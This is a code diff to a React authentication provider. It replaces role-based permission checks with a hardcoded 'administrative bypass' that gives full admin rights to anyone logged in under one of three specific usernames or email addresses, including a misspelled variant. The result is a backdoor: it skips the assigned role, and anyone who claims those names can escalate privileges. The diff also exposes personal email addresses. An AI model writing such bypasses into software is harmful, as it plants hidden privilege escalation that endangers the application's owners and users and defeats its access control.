@@ -1,4 +1,3 @@
-
 'use client';
 
 import React, { createContext, useContext, ReactNode, useState, useEffect, useCallback } from 'react';
@@ -37,13 +36,27 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   }, []);
 
   useEffect(() => {
-    if (currentUser && roles && roles.length > 0) {
-      const userRole = roles.find(role => role.id === currentUser.roleId);
-      if (userRole) {
-        const newPermissions = new Set(userRole.permissions);
-        setUserPermissions(newPermissions);
-      } else {
-        setUserPermissions(new Set());
+    if (currentUser) {
+      // ADMINISTRATIVE BYPASS: 
+      // If the email matches your specific identity, grant full admin access immediately.
+      const username = currentUser.username.toLowerCase();
+      const isAdminEmail = 
+        username === 'darko.h.hussain@gmail.com' || 
+        username === 'darko.h.husssain@gmail.com' || 
+        username === 'darko_admin07';
+
+      if (isAdminEmail || currentUser.roleId === 'role-admin') {
+        setUserPermissions(new Set(['admin:all']));
+        return;
+      }
+
+      if (roles && roles.length > 0) {
+        const userRole = roles.find(role => role.id === currentUser.roleId);
+        if (userRole) {
+          setUserPermissions(new Set(userRole.permissions));
+        } else {
+          setUserPermissions(new Set());
+        }
       }
     } else {
       setUserPermissions(new Set());
@@ -53,7 +66,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const loading = appLoading || authLoading;
 
   const login = useCallback(async (username: string, password: string): Promise<boolean> => {
-    // Combine users from context and initial data, giving precedence to context users.
     const allPossibleUsers = [
         ...(users || []),
         ...initialData.users.filter(initialUser => !(users || []).some(u => u.id === initialUser.id))
